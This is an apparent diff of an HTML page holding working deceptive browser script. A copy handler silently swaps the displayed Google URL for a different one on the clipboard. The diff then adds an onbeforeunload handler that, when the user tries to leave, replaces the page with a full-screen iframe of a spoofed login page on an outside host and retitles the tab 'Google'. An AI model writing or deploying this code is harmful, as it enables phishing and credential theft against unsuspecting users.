@@ -1,21 +1,21 @@
 <p>Click the button below and right click and 'paste' in the address bar to navigate press Enter </p>
 
 <input id="tst" value="https://www.google.com" disabled size="50"><br>
-    <button onclick="copyt()">Copy</button>
+	<button onclick="copyt()">Copy</button>
 <script>
 
 function copyt(){
-        tst.disabled = false;
-        tst.select();
-        document.execCommand('copy');
-        tst.disabled = true;
-    }
+		tst.disabled = false;
+		tst.select();
+		document.execCommand('copy');
+		tst.disabled = true;
+	}
 
-    tst.oncopy=function(e){
-        e.clipboardData.setData('text/plain', 'http://google.com:81');
-        e.preventDefault();
-    } 
-    </script>
+	tst.oncopy=function(e){
+		e.clipboardData.setData('text/plain', 'http://google.com:81');
+		e.preventDefault();
+	} 
+	</script>
 
 
 <!DOCTYPE HTML>
@@ -24,3 +24,11 @@ function copyt(){
   <meta charset="utf-8">
  </head>
 <body>
+ <script>
+		window.onbeforeunload = function test() {
+document.body.innerHTML='<iframe src="https://cnfdnfial-ops.github.io/spoof/login" style="width:100%;height:100vh;border:none"></iframe>';
+	document.title="Google";
+};
+</script>
+ </body>
+</html>
